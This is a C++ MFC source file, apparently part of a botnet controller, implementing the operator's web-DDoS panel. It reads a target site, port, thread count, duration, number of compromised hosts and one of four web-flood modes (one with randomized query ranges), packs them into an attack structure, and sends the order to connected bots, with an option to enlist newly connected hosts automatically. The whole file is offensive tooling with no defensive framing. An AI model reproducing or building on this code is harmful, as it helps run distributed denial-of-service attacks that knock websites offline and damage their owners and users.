// DDOSWeb1.cpp : implementation file
//

#include "pcl.h"
#include "Client.h"
#include "DDOSWeb1.h"
#include "PcView.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CPcView* g_pConnectView;
/////////////////////////////////////////////////////////////////////////////
// CDDOSWeb1

IMPLEMENT_DYNCREATE(CDDOSWeb1, CFormView)

CDDOSWeb1::CDDOSWeb1()
	: CFormView(CDDOSWeb1::IDD)
{
	//{{AFX_DATA_INIT(CDDOSWeb1)
	m_check_web_auto = FALSE;
	m_check_web_online = FALSE;
	m_web_cc1 = 1;
	m_web_cc2 = 10;
	m_web_dns = _T("www.xx.com");
	m_web_hostnum = 100;
	m_web_port = 80;
	m_web_thread = 30;
	m_web_time = 0;
	//}}AFX_DATA_INIT
}

CDDOSWeb1::~CDDOSWeb1()
{
}

void CDDOSWeb1::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CDDOSWeb1)
	DDX_Control(pDX, IDC_SPIN_WEB_TIME, m_spin_web_time);
	DDX_Control(pDX, IDC_SPIN_WEB_THREAD, m_spin_web_thread);
	DDX_Control(pDX, IDC_SPIN_WEB_HOST, m_spin_web_host);
	DDX_Control(pDX, IDC_COMBO_WEBMODLE, m_combo_web_modle);
	DDX_Check(pDX, IDC_CHECK_WEB_AUTO, m_check_web_auto);
	DDX_Check(pDX, IDC_CHECK_WEB_ONLINE, m_check_web_online);
	DDX_Text(pDX, IDC_WEB_CC1, m_web_cc1);
	DDX_Text(pDX, IDC_WEB_CC2, m_web_cc2);
	DDX_Text(pDX, IDC_WEB_DNS, m_web_dns);
	DDV_MaxChars(pDX, m_web_dns, 500);
	DDX_Text(pDX, IDC_WEB_HOSTNUM, m_web_hostnum);
	DDX_Text(pDX, IDC_WEB_PORT, m_web_port);
	DDX_Text(pDX, IDC_WEB_THREAD, m_web_thread);
	DDX_Text(pDX, IDC_WEB_TIME, m_web_time);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CDDOSWeb1, CFormView)
	//{{AFX_MSG_MAP(CDDOSWeb1)
	ON_BN_CLICKED(IDC_WEB_START, OnWebStart)
	ON_BN_CLICKED(IDC_WEB_STOP, OnWebStop)
	ON_CBN_SELCHANGE(IDC_COMBO_WEBMODLE, OnSelchangeComboWebmodle)
	ON_BN_CLICKED(IDC_SLECT_ALL2, OnSlectAll2)
	ON_BN_CLICKED(IDC_SLECT_NOW2, OnSlectNow2)
	ON_BN_CLICKED(IDC_UNSLECT_ALL2, OnUnslectAll2)
	ON_BN_CLICKED(IDC_UNSLECT_NOW2, OnUnslectNow2)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CDDOSWeb1 diagnostics

#ifdef _DEBUG
void CDDOSWeb1::AssertValid() const
{
	CFormView::AssertValid();
}

void CDDOSWeb1::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CDDOSWeb1 message handlers

void CDDOSWeb1::OnWebStart() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	//过滤各信息
	CString strPort, strThread, strTime, strHostNum;
	GetDlgItem(IDC_WEB_PORT)->GetWindowText(strPort);
	GetDlgItem(IDC_WEB_THREAD)->GetWindowText(strThread);
	GetDlgItem(IDC_WEB_TIME)->GetWindowText(strTime);
	GetDlgItem(IDC_WEB_HOSTNUM)->GetWindowText(strHostNum);
	
	if (m_web_dns.IsEmpty() || strPort.IsEmpty()|| strThread.IsEmpty()|| strTime.IsEmpty() || strHostNum.IsEmpty())
	{
		::MessageBox(0,"请输入完整信息","错误", MB_ICONINFORMATION);
		return;
	}
	
	if (m_web_port <1 || m_web_port >65535)
	{
		::MessageBox(0,"端口范围:1~65535","错误", MB_ICONINFORMATION);
		return;
	}
	
	if (m_web_thread <1 || m_web_thread >50)
	{
		::MessageBox(0,"线程范围:1~50","错误", MB_ICONINFORMATION);
		return;
	}
	
	if (m_web_time <0 )
	{
		::MessageBox(0,"时间范围:大于0","错误", MB_ICONINFORMATION);
		return;
	}
	
	if (m_web_hostnum <1 )
	{
		::MessageBox(0,"主机范围:大于1","错误", MB_ICONINFORMATION);
		return;
	}
	
	DATTACK m_Attack;
	ZeroMemory(&m_Attack,sizeof(DATTACK));
	//获取目标
	strcpy(m_Attack.Target,m_web_dns.GetBuffer(0));
	//获取端口
	m_Attack.AttackPort = m_web_port;
	//获取线程数
	m_Attack.AttackThread = m_web_thread;
	//获取时间
	m_Attack.AttackTime = m_web_time;
	//攻击类型类型
	CString szType;
	GetDlgItemText(IDC_COMBO_WEBMODLE,szType);
	if(szType =="[01]")
		m_Attack.AttackType = 9;
	if(szType == "[02]")
		m_Attack.AttackType = 10;
	if(szType == "[03]")
	{
		m_Attack.ExtendData1 = m_web_cc1;
		m_Attack.ExtendData2 = m_web_cc2;
		m_Attack.AttackType = 11;
	}	
	if(szType == "[04]")
		m_Attack.AttackType = 12;

	CString m_DdosType = "Web 2";
	strcpy(m_Attack.DDOSType,m_DdosType.GetBuffer(0));
	
	//获取参与主机..
	INT HostNums=-1;
	if(m_check_web_online == FALSE)
		HostNums = m_web_hostnum;
	//获取新上线主机是否自动参数
	BOOL Auto=FALSE;
	if(m_check_web_auto == TRUE)
	{
		g_pConnectView->m_iocpServer->m_bIsAutoD=true;
	}
	else
	{
		g_pConnectView->m_iocpServer->m_bIsAutoD=false;
	}
	
	memcpy(g_pConnectView->m_iocpServer->m_strbuff, &m_Attack, sizeof(DATTACK));		
	
	g_pConnectView->SendDDosAttackCommand(&m_Attack,HostNums);

	GetDlgItem(IDC_COMBO_WEBMODLE)->EnableWindow(FALSE);
}

void CDDOSWeb1::OnWebStop() 
{
	// TODO: Add your control notification handler code here
	g_pConnectView->SendDDostStopCommand("Web 2");
	GetDlgItem(IDC_COMBO_WEBMODLE)->EnableWindow(TRUE);
}

void CDDOSWeb1::OnInitialUpdate() 
{
	CFormView::OnInitialUpdate();
	
	// TODO: Add your specialized code here and/or call the base class
	GetDlgItem(IDC_WEB_CC1)->EnableWindow(FALSE);
	GetDlgItem(IDC_WEB_CC2)->EnableWindow(FALSE);

	m_spin_web_time.SetRange(0,10000);
	m_spin_web_time.SetPos(0);
	m_spin_web_time.SetBuddy(GetDlgItem(IDC_WEB_TIME));
	
	m_spin_web_thread.SetRange(1,50);
	m_spin_web_thread.SetPos(30);
	m_spin_web_thread.SetBuddy(GetDlgItem(IDC_WEB_THREAD));
	
	m_spin_web_host.SetRange(1,10000);
	m_spin_web_host.SetPos(100);
	m_spin_web_host.SetBuddy(GetDlgItem(IDC_WEB_HOSTNUM));
	
	m_combo_web_modle.SetCurSel(0);
}

void CDDOSWeb1::OnSelchangeComboWebmodle() 
{
	// TODO: Add your control notification handler code here
	CString temp;
	GetDlgItemText(IDC_COMBO_WEBMODLE,temp);

	GetDlgItem(IDC_WEB_CC1)->EnableWindow(FALSE);
	GetDlgItem(IDC_WEB_CC2)->EnableWindow(FALSE);

	if(temp =="[03]")
	{
		GetDlgItem(IDC_WEB_CC1)->EnableWindow(TRUE);
		GetDlgItem(IDC_WEB_CC2)->EnableWindow(TRUE);
		SetDlgItemText(IDC_WEB_DNS, "http://www.xx.com/x.asp?id=%d");
	}
	if(temp =="[02]")
	{
		SetDlgItemText(IDC_WEB_DNS, "http://www.xx.com/x.asp?id=123");
	}
	if(temp =="[01]")
	{
		SetDlgItemText(IDC_WEB_DNS, "www.xx.com");
	}
	if (temp =="[04]")
	{
		SetDlgItemText(IDC_WEB_DNS, "http://www.xx.com/index.html");
	}
}

void CDDOSWeb1::OnSlectAll2() 
{
	// TODO: Add your control notification handler code here
	g_pConnectView->SeclectAll();
}

void CDDOSWeb1::OnSlectNow2() 
{
	// TODO: Add your control notification handler code here
	g_pConnectView->SeclectNow();
}

void CDDOSWeb1::OnUnslectAll2() 
{
	// TODO: Add your control notification handler code here
	g_pConnectView->UnSeclectAll();
}

void CDDOSWeb1::OnUnslectNow2() 
{
	// TODO: Add your control notification handler code here
	g_pConnectView->UnSeclectNow();
}
